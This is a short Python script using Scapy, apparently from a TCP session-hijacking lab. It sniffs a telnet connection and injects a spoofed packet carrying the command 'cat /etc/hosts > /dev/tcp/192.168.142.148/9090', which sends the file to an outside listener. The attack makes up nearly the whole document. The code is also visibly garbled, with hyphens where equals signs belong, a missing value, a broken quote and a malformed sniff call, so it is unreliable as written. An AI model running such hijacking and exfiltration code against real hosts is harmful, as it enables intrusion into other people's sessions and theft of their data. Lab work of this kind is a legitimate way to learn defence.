from scapy.all import *
def spoof (pkt) :
	pre_ip = pkt [IP]
	pre_tcp = pkt [TCP]

	ip = IP(src=pre ip.src, dst-pre_ip.dst) 
	print (pre_ip.src)
	print (pre_tcp.sport)
	data = "\rcat /etc/hosts > /dev/tcp/192.168.142.148/9090\r"

	tcp = TCP(sport-pre tcp.sport, dport-pre tcp.dport, flags="A", seq=pre_tcp.seq+1,ack-pre_tcp.ack)

	pkt = ip/tcp/data
	pkt.show
	send (pkt, verbose=, iface= br-5385cec0d4a8")
	sniff filter='tcp and sr bost 10.9.0.6 and dst host 10.9.0.7 and dst port 23', prn=spoof, iface="br 5385cec0d4a8" 



